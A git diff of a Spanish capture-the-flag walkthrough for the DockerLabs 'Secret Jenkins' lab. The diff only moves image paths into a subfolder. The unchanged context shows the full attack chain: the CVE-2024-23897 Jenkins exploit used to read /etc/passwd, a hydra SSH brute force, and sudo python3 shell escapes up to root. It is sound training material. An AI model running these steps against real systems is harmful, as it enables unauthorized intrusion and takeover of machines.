@@ -4,7 +4,7 @@
 
 Empezamos descargando la imagen de dockerlabs
 
-![Descarga de Dockerlabs](./descarga.png)
+![Descarga de Dockerlabs](./imagenes/descarga.png)
 
 y luego, seguido de un:
 
@@ -18,7 +18,7 @@ Para poder descomprimirlo, desplegamos la maquina usando el comando
 sudo ./auto_deploy.sh secretjenkins.tar
 ```
 
-![Despliegue de Secret Jenkins](./despliegue.png)
+![Despliegue de Secret Jenkins](./imagenes/despliegue.png)
 
 Ahora que la maquina ya esta desplegada, si podemos comenzar con el hackeo!
 
@@ -34,7 +34,7 @@ nmap -sV -p- 172.17.0.2 -Pn
 - -p-: Escanea todos los puertos
 ```
 
-![Escaneo de puertos](./escaneo.png)
+![Escaneo de puertos](./imagenes/escaneo.png)
 
 Podemos detectar que hay un servicio de Jenkins corriendo en el puerto **8080**, especificamente la version **10.0.18**, ademas de un usual ssh en el puerto **22**.
 
@@ -59,7 +59,7 @@ git clone https://github.com/Maalfer/CVE-2024-23897.git
 cd CVE-2024-23897
 ```
 
-![Clonacion de repo](./clone.png)
+![Clonacion de repo](./imagenes/clone.png)
 
 Una vez dentro del directorio, podemos ver que hay un archivo python llamado `CVE-2024-23897.py` que usaremos con el mismo ejemplo dentro del repo, para que nos permita leer el archivo `/etc/passwd` de la maquina, para buscar algun usuario divertido.
 
@@ -67,7 +67,7 @@ Una vez dentro del directorio, podemos ver que hay un archivo python llamado `CV
 python3 CVE-2024-23897.py 172.17.0.2 8080 /etc/passwd
 ```
 
-![Explotacion de la vulnerabilidad](./exploit.png)
+![Explotacion de la vulnerabilidad](./imagenes/exploit.png)
 
 Podemos ver dos usuarios que pueden ser interesantes...
 
@@ -80,7 +80,7 @@ Ambos usuarios parecen ser interesantes, por lo que podemos intentar realizar un
 hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 
-![fuerza bruta](./hydra.png)
+![fuerza bruta](./imagenes/hydra.png)
 
 Con el usuario bobby podemos ver que ha sido exitoso en el ataque de fuerza bruta, obteniendo la siguiente contraseña:
 
@@ -92,7 +92,7 @@ Asi que ahora podemos intentar acceder al ssh de la maquina usando estas credenc
 ssh bobby@172.17.0.2
 ```
 
-![ssh](./ssh.png)
+![ssh](./imagenes/ssh.png)
 
 Y estamos dentro de la máquina!
 
@@ -114,7 +114,7 @@ Podemos ver que el usuario bobby puede ejecutar el comando `/usr/bin/python3` co
 
 Buscando en GTFOBins encontramos que podemos usar el siguiente comando para obtener una shell como el usuario de los permisos:
 
-![GTFOBins](./gtfobins.png)
+![GTFOBins](./imagenes/gtfobins.png)
 
 ```bash
 sudo -u pinguinito python3 -c 'import os; os.system("/bin/bash")'
@@ -125,7 +125,7 @@ sudo -u pinguinito python3 -c 'import os; os.system("/bin/bash")'
 
 Esto nos dará una shell interactiva como el usuario `pinguinito`, lo que nos permitirá explorar el sistema con mayores privilegios.
 
-![Shell interactiva](./pinguinito.png)
+![Shell interactiva](./imagenes/pinguinito.png)
 
 Ahora como el usuario pinguinito podemos explorar el sistema con mayores privilegios. Usando otro `sudo -l` podemos revisar sus permisos
 
@@ -160,6 +160,6 @@ pinguinito@7e70d0a3ba24:/home/bobby$ echo 'import os; os.system("/bin/bash")' > 
 pinguinito@7e70d0a3ba24:/home/bobby$ sudo /usr/bin/python3 /opt/script.py
 ```
 
-![root](./elevacionroot.png)
+![root](./imagenes/elevacionroot.png)
 
 Y una vez con el usuario root, hemos conseguido escalar privilegios y obtener acceso total al sistema!
